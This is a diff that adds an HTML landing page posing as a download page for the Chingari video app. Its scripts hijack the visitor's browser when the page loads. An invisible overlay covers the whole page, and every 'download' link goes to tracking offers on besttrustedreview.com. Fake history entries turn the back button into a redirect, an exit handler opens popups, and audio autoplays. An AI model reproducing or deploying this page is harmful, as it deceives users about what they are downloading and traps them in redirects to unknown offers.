@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title> Chingari </title>
+  <link media="all" rel="stylesheet" type="text/css" href="css/style.min.css">
+  <script src="js/jquery.min.js"></script>
+</head>
+
+<body class="en ltr" onload="translate()">
+  <div class="wrap">
+    <div class="fade">&nbsp;</div>
+    <div class="content">
+      <div class="title">
+        Chingari
+      </div>
+      <div class="message">
+        <p id="a1">अब तक, 5,00,000+ रचनाकारों हमारे मंच हर रोज का उपयोग मनोरंजक सामग्री पैदा कर रहे हैं ।</p>
+        <p id="a2"> आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें
+          शामिल हों
+          ।</p>
+      </div>
+      <div class="action">
+        <a href="#" class="finlink" id="a3">अभी डाउनलोड करें</a></div>
+      <a href="#" class="content-wrap finlink">&nbsp;</a>
+    </div>
+    <div class="helper">&nbsp;</div>
+  </div>
+
+  <audio autoplay="autoplay" preload="">
+    <source src="audio/default.mp3" type="audio/mpeg">
+    <source src="audio/default.ogg" type="audio/ogg">
+  </audio>
+
+  <a href="#" class="finlink" id="finlink-id"
+    style="position: fixed; left: 0;top: 0; display: block;width: 100%;height: 100%;z-index:99999;"></a>
+  <script>
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+    strAlert = "";
+
+    var translation = {
+      source: {
+        aler: "चिंगारी-मूल भारतीय लघु वीडियो ऐप!",
+        a1: "अब तक, 5,00,000+ रचनाकारों हमारे मंच हर रोज का उपयोग मनोरंजक सामग्री पैदा कर रहे हैं ।",
+        a2: "  आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें शामिल हों",
+        a3: "अभी डाउनलोड करें",
+
+      },
+      hi: {
+        aler: "चिंगारी-मूल भारतीय लघु वीडियो ऐप",
+        a1: "अब तक, 5,00,000+ रचनाकारों हमारे मंच हर रोज का उपयोग मनोरंजक सामग्री पैदा कर रहे हैं ।",
+        a2: "आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें शामिल हों",
+        a3: "अभी डाउनलोड करें",
+      },
+
+      id: {
+        aler: "Aplikasi video pendek India asli percikan",
+        a1: "Sejauh ini, 5.000.000+ pembuat konten membuat konten menghibur menggunakan platform kami setiap hari.",
+        a2: "Bergabunglah dengan kami untuk mengalami tahap desain khusus untuk memenuhi kebutuhan India modern yang berkembang pesat",
+        a3: "Unduh Sekarang",
+      },
+    };
+
+    function replace_text(lang, text) {
+      x = document.getElementById(text);
+      if (x) {
+        x.innerHTML = translation[lang][text];
+      } else {
+        console.log("element not Found: " + text);
+      }
+    }
+
+    function alert_string(lang, text) {
+      return translation[lang][text] + "\n\n";
+    }
+
+    function translation_available(lang) {
+      if (translation[lang]) {
+        return lang;
+      } else {
+        console.log("translation not Found: " + lang);
+        return "source";
+      }
+    }
+
+    function detect_language() {
+      var detected_language = navigator.language;
+      if (detected_language.length > 2) {
+        detected_language = detected_language[0] + detected_language[1];
+      };
+
+      if (jQuery.inArray(detected_language, ['ar', 'he', 'fa']) >= 0) {
+        $('html').attr('DIR', 'RTL');
+      }
+      return translation_available(detected_language);
+    }
+
+    function translate() {
+      var detected_language = detect_language();
+      for (y in translation["source"]) {
+        replace_text(detected_language, y);
+        if (y == 'aler') {
+          strAlert += translation[detected_language][y];
+        }
+      }
+      alert(strAlert);
+
+    }
+
+    function getURLParameter(name) {
+      return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+  </script>
+
+  <script type="text/javascript">
+    //var fin_link = decodeURIComponent(getURLParameter('p1'));
+	var fin_link = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3';
+    /*
+	var links = document.getElementsByClassName('finlink');
+    for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+    for (var j = 0; j < links.length; j++) {
+      links[j].addEventListener('click', function () {
+        window.onbeforeunload = null;
+      });
+    }
+	*/
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+
+    //Historyback
+    ! function () {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+        onpopstate = function (t) {
+          window.onbeforeunload = null;
+          t.state && location.replace(fin_link);
+        };
+      } catch (o) {}
+    }();
+  </script>
+
+<script type="text/javascript">
+	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
+	
+	document.getElementById("finlink-id").href = nc;
+
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें शामिल हों';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
+</script>
+
+
+</body>
+
+</html>
